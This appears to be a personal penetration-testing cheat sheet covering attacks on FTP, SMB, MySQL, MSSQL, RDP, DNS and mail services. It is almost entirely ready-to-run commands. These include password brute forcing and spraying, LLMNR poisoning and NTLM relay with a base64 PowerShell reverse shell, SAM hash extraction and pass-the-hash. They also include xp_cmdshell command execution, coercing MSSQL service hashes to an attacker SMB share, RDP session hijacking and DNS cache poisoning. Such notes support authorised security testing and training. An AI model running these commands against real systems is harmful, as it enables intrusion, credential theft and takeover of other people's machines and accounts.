Navigation: [[Pentesting]]

---
# Protocols
1. FTP
2. SMB
3. MySQL
4. MSSQL
5. RDP
6. DNS
7. Mail Servers
# FTP
### Enumeration
**Local Config**
```shell
cat /etc/vsftpd.conf | grep -v "#"

cat /etc/ftpusers
```
**Remote Enumeration**
```shell
nmap --script ftp-* -p 21 <ip>
```
### Brute Force
**Hydra**
```shell
hydra -l <user> -P <password_list> ftp://<host>
```
**Medusa**
```shell
medusa -u <user> -P <password_list> -h <host> -M ftp 
```
### Bounce Attack
In an FTP bounce attack, we're using a proxy FTP server to perform our attacks. This proxy is usually located in a DMZ. Here's a diagram from G4G:
![[ftp_bounce_attack.webp]]

**FTP Bounce using Nmap:**
```shell
nmap -Pn -v -n -p80 -b <user>:<pass>@<external_host> <internal_host>
```

Here's some further [reading](http://www.ouah.org/ftpbounce.html).
# SMB
### Enumeration
**Nmap Scan**
```shell
sudo nmap <Host> -sV -sC -p139,445
```

**Finding server shares:**
```shell
smbclient -N //<host>

smbmap -H <host> # Add -r <directory> to view directory
```

**Downloading and Uploading (If Allowed):**
```shell
smbmap -H <host> --download "notes\note.txt"

smbmap -H <host> --upload test.txt "notes\test.txt"
```

**RPC Client:**
Use the [SANS Cheatsheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) or [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) to find commands to use after.
```shell
rpcclient -U'%' <host>

rpcclient -U "username%passwd" <IP> #With creds
```

**Enum4Linux**
[Source](https://github.com/cddmp/enum4linux-ng)
```shell-session
./enum4linux-ng.py <host> -A -C
```
### Brute Force
```shell
nmap --script smb-brute -p 445 <IP>

hydra -l Administrator -P words.txt <host> smb -t 1
```

### CrackMapExec
**Brute Force Users**
```shell
crackmapexec smb <host> -u /tmp/userlist.txt -p <'password'>
```

**Execute Command**
```shell
crackmapexec smb 10.10.110.17 -u <user> -p <'password'> -x <'cmd'> --exec-method smbexec
```

**Enumerate Logged on Users**
```shell
crackmapexec smb <IP>/24 -u administrator -p 'Password123!' --loggedon-users
```

**Extract SAM Hashes**
```shell
crackmapexec smb <host> -u administrator -p 'Password123!' --sam
```

**Pass-The-Hash**
```shell
crackmapexec smb <host> -u Administrator -H <hash>
```
### Responder
Tool used to poison `LLMNR`, `NBT-NS`, and `MDNS`. It can also set up fake services to steal `NetNTLM v1/v2` hashes.

**Setting up a Fake Server**
```shell
responder -I <interface name>
```
### Impacket
**Connect to Host**
Same options for `impacket-smbexec` and `impacket-atexec`
```shell
impacket-psexec <user>:<'password'> <host>
```

The next few commands are for use with `Responder`. Ensure the following:
```shell
cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

**Extract SAM Hashes**
```shell
impacket-ntlmrelayx --no-http-server -smb2support -t <host>
```

**Execute Reverse Shell**
[Create shell here](https://www.revshells.com/)
```shell
impacket-ntlmrelayx --no-http-server -smb2support -t <host> -c 'powershell -e <base64 reverse shell>' # -c option allows us to use commands
```
# MySQL
[HackTricks Link][https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql]

**Nmap**
```shell
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse <host> -p 3306
```

**Connecting to the Server**
```shell
mysql -u <user> -p<password> -h <host>
```

**Default Databases**

| **Database**         | **Description**                                                                     |
| -------------------- | ----------------------------------------------------------------------------------- |
| `mysql`              | System database that contains tables to store required information                  |
| `information schema` | Metadata                                                                            |
| `performance schema` | Monitor low level execution                                                         |
| `sys`                | Set of objects to help DBAs and developers interpret data from `performance schema` |
**Writing Files**
First we'll need to check if we have [`secure_file_priv`](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv):
1. If empty, variable has no effect
2. If set to name of a directory, imports and export operations only worth in that directory. The directory must also exist and is not created by the server
3. If `NULL`, import and export operations are disabled

```shell
# checking for perms
show variables like "secure_file_priv";

# this means the value isn't set
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```

Here's how we can perform an arbitrary file write using [`SELECT INTO OUTFILE`](https://mariadb.com/kb/en/select-into-outfile/):
```shell
SELECT <file contents> INTO OUTFILE '<directory>'
```

**Reading Files**
Generally we don't have arbitrary read, but if the correct permissions are set, here's how we can do so:
```shell
select LOAD_FILE("<file_path>");
```

# MSSQL
**Connecting to the Server From Linux**
```shell
sqsh -S <host> -U <user> -P <pass> -h # last option disables headers and footers

mssqlclient.py -p <port> <user>@<IP> # requires impacket tool
```

**Specifying Local Accounts**
If we're using Windows authentication, we need to specify the domain name or host of the target machine. Otherwise, it'll assume SQL authentication and only look at users created in the SQL server. We can do this with two ways:
1. `SERVERNAME\accountname`
2. `.\\accountname`

**Default Databases**

| **Database** | **Description**                                                                                   |
| ------------ | ------------------------------------------------------------------------------------------------- |
| `master`     | Keeps information for the instance                                                                |
| `msdb`       | Used by server agent                                                                              |
| `model`      | Template database copied for every new database                                                   |
| `resource`   | Read-only database to keep system objects visible in every database on the server in `sys` schema |
| `tempdb`     | Keeps temporary objects used for queries                                                          |
**Command Execution**
`MSSQL` has something called `xp_cmdshell`, disabled by default, that allows for system command execution using SQL. Important things to keep in mind:
1. Enabled and disabled using policies or by executing `sp_configure`
2. Process spawned has same permissions as service account, process doesn't return control to user until command is complete

**Using Commands**
```sql
xp_cmdshell '<cmd>'
```

**Writing Local Files**
To write files, we need [`OLE Automation Procedures`](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option) which requires admin privileges, then we can execute stored procedures to create a file. To enable permissions:
```shell
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE
```

Then here's how to create a file:
```shell
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '<file_path>', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<file_contents>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```

**Reading Local Files**
By default, we can read any file that the service account has read access to:
```shell
SELECT * FROM OPENROWSET(BULK N'<file_path>', SINGLE_CLOB) AS Contents
```

**Stealing MSSQL Service Hash**
For this to work, we'll need to start `Responder` or `impacket-smbserver`. Then we can run any of these commands (with the IP being our fake server):
```shell
EXEC master..xp_dirtree '\\<IP>\share\'

EXEC master..xp_subdirs '\\<IP>\share\'
```

**User Impersonation**
MSSQL has a special permission called `IMPERSONATE` that allows us to take on the permissions of another user until the context is reset or session ends. By default, Sysadmins can impersonate anyone. 

Here's how we can find a list of users we can impersonate:
```shell
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

Checking if we're sysadmin:
```shell
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

Impersonating a user:
```shell
EXECUTE AS LOGIN = '<user>'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

**Communicating with Other Databases**
In MSSQL, there's a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). They enable the database to execute a Transact-SQL statement that includes tables from another instance.

Identifying linked servers:
```shell
SELECT srvname, isremote FROM sysservers
```

Accessing a linked table:
```shell
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<server name>]
```
# RDP
**Nmap**
```shell
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```

**Connecting to the Service**
```shell
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
xfreerdp [/d:domain] /u:<username> /pth:<NTLM hash> /v:<IP> #Pass the hash
```

Note for Pass the Hash, we'll need to enabled `Restricted Admin Mode` to allow admin logon through RDP:
```shell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

**Password Spraying**
```shell
# https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

# hydra
hydra -L usernames.txt -p 'password123' <IP> rdp
```

**Session Stealing**
With SYSTEM permissions, you can access any opened RDP session by any user without a password.

First, we'll need to get open sessions:
```shell
query user
```

Then to access the session:
```shell
tscon <ID> /dest:<SESSIONNAME>
```

We can also access the session using [`Microsoft sc.exe`](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create). We'll need to specify a service name and path for the binary to run (in this case, `session_hijack` and `cmd.exe` respectively):
```shell
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <ID> /dest:<SESSIONNAME>"

net start sessionhijack
```
# DNS
**Nmap**
```shell
nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" <IP>
```

Here's a map of DNS domains:
![[DNS Image.png]]

**Types of DNS Servers**

| **Server Type**   | **Description**                                                                                                                                                                           |
| ----------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Root              | Top of hierarchy, manages top level domains and only steps in if lower-level servers don't respond. Managed by Internet Corporation for Assigned Names and Numbers, only 13 in the world. |
| Authoritative     | Have the final say for queries in designated zones, offering definitive answers. If they can't answer, root server steps in.                                                              |
| Non-authoritative | Lacks ownership over DNS zones, gathers domain information through queries to other servers.                                                                                              |
| Caching           | Caches previous queries to speed up response times for future requests. Cache time dictated by authoritative server.                                                                      |
| Forwarding        | Forwards relay queries to other servers.                                                                                                                                                  |
| Resolver          | Integrated within hosts or routers. Execute name resolution locally and aren't authoritative.                                                                                             |
**Record Types**


| **Record** | **Description**                                                                                       |
| ---------- | ----------------------------------------------------------------------------------------------------- |
| `A`        | IPv4 address of a domain.                                                                             |
| `AAAA`     | IPv6 address of a domain.                                                                             |
| `MX`       | Responsible mail servers.                                                                             |
| `NS`       | DNS servers of domain.                                                                                |
| `TXT`      | Used as a wildcard for information. Commonly used to validate SSL certificates and for DMARC entries. |
| `CNAME`    | Contains aliases for `A` record of a domain.                                                          |
| `PTR`      | Used for reverse lookup, converts IP address to domain name.                                          |
| `SOA`      | Information for DNS zone and email address of administrative contact.                                 |

**Querying Domain Information**
```shell
dig any victim.com @<DNS_IP>
```

**Zone Transfers**
This attack is used to gain information about a DNS zone record, which can contain info about subdomains, IP addresses, and other network resources.
```shell
dig axfr @<DNS_IP> #Try zone transfer without domain
dig axfr @<DNS_IP> <DOMAIN> #Try zone transfer guessing the domain
fierce --domain <DOMAIN> --dns-servers <DNS_IP> #Will try to perform a zone transfer against every authoritative name server and if this doesn't work, will launch a dictionary attack
```

**More Information**
```shell
dig ANY @<DNS_IP> <DOMAIN>     #Any information
dig A @<DNS_IP> <DOMAIN>       #Regular DNS request
dig AAAA @<DNS_IP> <DOMAIN>    #IPv6 DNS request
dig TXT @<DNS_IP> <DOMAIN>     #Information
dig MX @<DNS_IP> <DOMAIN>      #Emails related
dig NS @<DNS_IP> <DOMAIN>      #DNS that resolves that name
dig -x 192.168.0.2 @<DNS_IP>   #Reverse lookup
dig -x 2a00:1450:400c:c06::93 @<DNS_IP> #reverse IPv6 lookup

#Use [-p PORT]  or  -6 (to use ivp6 address of dns)
```

**Domain Takeover**
This attack involved registering a non-existent domain name to gain control over another domain. It's also possible with subdomains, known as subdomain takeover.

Here's how we can find subdomains using [`Subfinder`](https://github.com/projectdiscovery/subfinder):
```shell
./subfinder -d <domain> -v
```

We can also use [`subbrute`](https://github.com/TheRook/subbrute) if we don't have internet access:
```shell 
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "<DNS Server>" > ./resolvers.txt
./subbrute <"domain"> -s ./names.txt -r ./resolvers.txt
```

**DNS Cache Poisoning**
We can perform DNS Cache poisoning using MITM tools like [`Ettercap`](https://www.ettercap-project.org/) or [`Bettercap`](https://www.bettercap.org/).

First we'll need to edit `/etc/ettercap/etter.dns`:
```shell
<target domain>  A  <attacker IP>
```

Next start `Ettercap` and go to `Hosts` -> `Scan for Hosts`. Then add the target IP to `target1`, set the default gateway IP as `target2`.

Then we can activate the attack by going to `Plugins` -> `Manage Plgugins`. If successful, this attack will redirect users attempting to visit the domain to a fake page that we control. Additionally, pinging the domain should ping our IP as well.
# Mail Servers
### SMTP
**Nmap**
```shell
nmap -p25 --script smtp-commands <IP>
nmap -p25 --script smtp-open-relay <IP> -v
nmap --script smtp-enum-users <IP>
```

**Connect to the Service**
```shell
telnet <IP> 25
```

**Checking User Validity**
```shell
VRFY <user> # will return whether or not a user is valid
EXPN <user or list> # similar to VRFY  but can list users
```

**Username Brute Force**
```shell
smtp-user-enum -M RCPT -U userlist.txt -D <email domain> -t <IP>
```

**Open Relay**
Allows mail from any source to be re-routed through the open relay server. Masks the source of messages and makes it look like it came from open relay server.

The `nmap` script above checks for open relay. If it's allowed, here's how we can send mail:
```shell
swaks --from <sender> --to <recipient> --header 'Subject: <subject>' --body '<message>' --server <IP>
```

### POP3
**Connecting to the Server**
```shell
telnet 10.10.110.20 110
```

**Checking User Validity**
```shell
USER <username>
```

**Password Attack**
```shell
hydra -L users.txt -p '<password>' -f <IP> pop3 # also works for other email servers
```
### Office365
This all uses [`O365Spray`](https://github.com/0xZDH/o365spray)

**Checking Server Validity**
```shell
python3 o365spray.py --validate --domain <target domain>
```

**Username Spray**
```shell
o365spray.py --enum -U users.txt --domain <target domain>
```

**Password Spray**
```shell
python3 o365spray.py --spray -U <users list> -p <password> --count 1 --lockout 1 --domain <target domain>
```

---
Navigation: [[Pentesting]]